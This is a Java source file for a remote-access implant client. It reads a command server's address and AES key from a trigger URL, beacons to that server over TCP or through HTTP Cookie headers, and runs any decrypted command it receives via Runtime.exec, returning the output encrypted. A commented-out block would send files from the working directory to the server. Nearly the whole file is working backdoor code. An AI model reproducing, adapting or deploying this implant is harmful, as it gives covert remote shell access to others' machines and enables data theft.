package com.revsni.client;

import java.io.BufferedReader;
import java.io.EOFException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;


import java.net.Socket;
import java.net.URL;

import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.UUID;

import javax.crypto.*;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

//import java.util.List;
//import java.util.Arrays;
//import java.util.Collection;
//import java.io.File;
//import java.io.FileInputStream;
//import com.revsni.utils.FileData;
//import com.revsni.utils.KeyboardFilesFilter;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Client {
    protected static final Logger parentLogger = LogManager.getLogger();
    private Logger LOG = parentLogger;

    private UUID uniqueID;
    private Socket reqSock;
    private String[] address = new String[2];

    private ObjectOutputStream dataOut;
    private ObjectInputStream dataIn;

    private Cipher cipherEnc;
    private Cipher cipherDec;

    private CloseableHttpClient httpClient;


    private SecretKey key;
    private IvParameterSpec iv;

    private volatile boolean trigCheck = false;
    private volatile boolean connExists = false;
    private volatile boolean httpEst = false;

    private volatile String type;

    public Client(UUID uniUuid) {
        this.uniqueID = uniUuid;
        this.type = "TCP";

    }

    private boolean init() {
        if(type.equals("TCP")) {
            if(!connExists) {
                try {
                    LOG.error("INIT");
    
                    int port = Integer.parseInt(address[1]);
                    
                    LOG.error(address[0] + " ");
                    LOG.error(address[1]);
    
                    reqSock = new Socket(address[0], port);
    
                    dataOut = new ObjectOutputStream(reqSock.getOutputStream());
                    dataOut.flush();
                    dataIn = new ObjectInputStream(reqSock.getInputStream());
    
                    sendMessage(uniqueID + ": just arrived to vacation!");
                    connExists = true;
    
                    return true;
                } catch(IOException | InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException e) {
                    LOG.error("catch in init");
                    e.printStackTrace();
                    return false;
                }
    
            } else {
                return false; 
            }
        }
        if(type.equals("HTTP")) {
            httpClient = HttpClients.createDefault();
            String uri = new String("http://" + address[0] + ":" + address[1] +"/lit");
            HttpGet httpGet = new HttpGet(uri);
            try {
                httpGet.addHeader("Cookie", Base64.getEncoder().encodeToString(cipherEnc.doFinal("est".getBytes())));
            } catch (IllegalBlockSizeException | BadPaddingException e2) {
                e2.printStackTrace();
            }
            try(CloseableHttpResponse responseInitial = httpClient.execute(httpGet)) {
                close();
                handleMessage(responseInitial.getHeaders("Cookie")[0].getValue());
                httpEst = true;
                connExists = true;
                return true;
            } catch(Exception e) {
                e.printStackTrace();
                connExists = false;
                type = "TCP";
                init();
                try {
                    sendMessage("HTTP failed, fallback to TCP");
                } catch (InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException e1) {
                    e1.printStackTrace();
                }
                return false;
            }
        } else {
            return false;
        }
        
    }

    private void close() {
        try {
            dataIn.close();
            dataOut.close();
            reqSock.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private boolean checkTrig() throws IOException {
        //Go for webserver and extract IP, Port and Key. Then set and use the stuff
        try {
            String URL = "http://127.0.0.1:8082/output.txt";
            URL url = new URL(URL);

            Document doc = Jsoup.parse(url, 1000 * 3);
            String text = doc.body().text();

            LOG.error(text);

            String outp[] = text.split(";");

            address[0] = outp[0];
            address[1] = outp[1];
            LOG.error(address[0]);

            byte[] decodedKey = Base64.getDecoder().decode(outp[3]);
            byte[] decodedIv = Base64.getDecoder().decode(outp[4]);

            this.type = new String(Base64.getDecoder().decode(outp[2]));

            this.key = new SecretKeySpec(decodedKey, "AES");
            this.iv = new IvParameterSpec(decodedIv);

            LOG.error("CheckTrigTrue");
            trigCheck = true;
            return true;
        } catch (IOException e) {
            LOG.error("catch in checktrig");
            trigCheck = false;
            return false;
        }
        
    }

    private boolean updateStuff() {
        try {
            checkTrig();
        } catch (IOException e) {
            return false;
        }
        return true;
    }

    private void sendMessage(String msg) throws InvalidKeyException, InvalidAlgorithmParameterException, NoSuchPaddingException {
        try {
            LOG.error("Send message :" + msg);

            cipherEnc = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipherEnc.init(Cipher.ENCRYPT_MODE, this.key, this.iv);

            String encoded = new String(Base64.getEncoder()
                .encode(cipherEnc.doFinal(msg.getBytes())));

            LOG.debug(encoded);
            if(type.equals("TCP")) {
                dataOut.writeObject(encoded);
                dataOut.flush();
            }
            if(type.equals("HTTP")) {
                httpClient = HttpClients.createDefault();
                System.out.println("http://" + address[0] + ":" + address[1] +"/lit");
                HttpGet httpGet = new HttpGet("http://" + address[0] + ":" + address[1] +"/lit");
                httpGet.setHeader("Cookie", encoded);
                try {
                    httpClient.execute(httpGet);
                } catch(Exception e) {
                    e.printStackTrace();
                }
            }


            
        } catch (IOException | NoSuchAlgorithmException | IllegalBlockSizeException | BadPaddingException e) {
            e.printStackTrace();
        }
    }

    public void handleCentral() {
        switch(type) {
            case("HTTP"): getInstr();
        }
    }

    public void handleCentral(String msg) {
        switch(type) {
            case("TCP"): handleMessage(msg);
        }
    }

    public void handleMessage(String msg) {
        String answer = "";
        if(msg.length() > 1) {

            try {
                cipherDec = Cipher.getInstance("AES/CBC/PKCS5Padding");
                cipherDec.init(Cipher.DECRYPT_MODE, this.key, this.iv);
                
                String message  = new String(cipherDec.doFinal(Base64.getDecoder()
                    .decode(msg)));

                System.out.println(message);

                if(message.equals("httpSw")) {
                    type = "HTTP";
                    updateStuff();
                    init();
                } else if (message.equals("exit")) {
                    sendMessage(uniqueID + ": said goobye, sadly.");
                    close();
                    System.exit(0);
                } else {

                    BufferedReader stdInput = null;
                    BufferedReader stdError = null;
                    try {
                        Runtime rt = Runtime.getRuntime();
                        Process proc = rt.exec(message);

                        stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));

                        stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
                        try {
                            String s = null;
                            while ((s = stdInput.readLine()) != null) {
                                answer += s;
                                answer += "\n";
                            }
                            // Read any errors from the attempted command
                            while ((s = stdError.readLine()) != null) {
                                answer += s;
                                answer += "\n";
                            }
                            sendMessage(answer);
                            stdInput.close();
                            stdError.close();
                
                        } catch (IOException e) {
                            sendMessage("Failed to execute: " + message);
                        } 
                    } catch (IllegalArgumentException | IOException e) {
                        if(e instanceof IllegalArgumentException) {
                            sendMessage("Do not send empty commands!");
                        } else if(e instanceof IOException) {
                            sendMessage("Failed to read BufIO");
                        }
                    }
                }
            
            } catch (InvalidKeyException | InvalidAlgorithmParameterException | NoSuchAlgorithmException | NoSuchPaddingException | IllegalBlockSizeException | BadPaddingException e) {
                LOG.error("lul");
            }
        }
            
    }

    public void getInstr() {
        httpClient = HttpClients.createDefault();
        HttpGet httpGet = new HttpGet("http://" + address[0] + ":" + address[1] +"/lit");
        try {
            httpGet.addHeader("Cookie", Base64.getEncoder().encodeToString(cipherEnc.doFinal("give".getBytes())));
        } catch (IllegalBlockSizeException | BadPaddingException e1) {
            e1.printStackTrace();
        }
        try(CloseableHttpResponse responseInitial = httpClient.execute(httpGet)) {
            String instr = responseInitial.getHeaders("Cookie")[0].getValue();
            if(instr.length() > 3) {
                handleMessage(instr);
            }
        } catch(Exception e) {
            System.out.println("No instructions");
        }
    }

    //Filetransfer methodos

    /*
    private Collection<File> prepareFilesToSend() {
        String directoryPath = System.getProperty("user.dir");
        File directory = new File(directoryPath);

        File[] files = directory.listFiles(new KeyboardFilesFilter());
        List<File> filesFound = Arrays.asList(files);

        return filesFound;
    }
    
    private FileData createFileData(File file, String directory) {
        FileInputStream fileInputStream = null;
        DataInputStream dataInputStream = null;
        FileData fileData = new FileData();

        String filename = file.getName();
        fileData.setFilename(filename);
        fileData.setSourceDirectory(file.getParent());
        String destinationDirectory = uniqueID + "/" + directory + "/";
        fileData.setDestinationDirectory(destinationDirectory);

        try {
            fileInputStream = new FileInputStream(file);
            dataInputStream = new DataInputStream(fileInputStream);

            int length = (int) file.length();
            byte[] fileBytes = new byte[length];

            int totalBytesRead = 0;
            int read;

            while (totalBytesRead < length &&
                  (read = dataInputStream.read(fileBytes,totalBytesRead,length - totalBytesRead)) >= 0) {
                totalBytesRead += read;
            }

            fileData.setFileSize(length);
            fileData.setFileData(fileBytes);
            fileData.setStatus(FileData.Status.SUCCESS);
        }
        catch (IOException e) {
            e.printStackTrace();
            fileData.setStatus(FileData.Status.ERROR);
        }
        finally {
            try {
                if(fileInputStream != null)
                    fileInputStream.close();
                if (dataInputStream != null)
                    dataInputStream.close();
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }

        return fileData;
    }

    private void sendFile(File file, String directory) {
        FileData fileData = createFileData(file, directory);

        try {
            dataOut.writeObject(fileData);
            dataOut.flush();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
        fileData = null;
        System.gc();
    }

    private void sendFiles(Collection<File> files, String directory) {
        System.gc();

        for (File file : files) {
            sendFile(file, directory);
        }
    }
    */

    public void run() {
        try {
            while (!checkTrig() && !trigCheck) {
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        LOG.error("Passed checktrig");
        if(type.equals("TCP")) {
            if (!init()) {
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                return;
            } 
        }

        if(type.equals("TCP")) {
            while (!reqSock.isClosed()) {
                try {
                    String message = (String) dataIn.readObject();
                    handleCentral(message);
                    Thread.sleep(10000);
                } catch(InterruptedException | IOException | ClassNotFoundException e) {
                    if(e instanceof EOFException) {
                        try {
                            sendMessage("Connection gets reset because EOF Exception on Client");
                            close();
                        } catch (InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException e1) {
                            close();
                        }
                    }
                } 
            }
        }
        if(type.equals("HTTP")) {
            while(httpEst) {
                try {
                    Thread.sleep(10000);
                    handleCentral();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
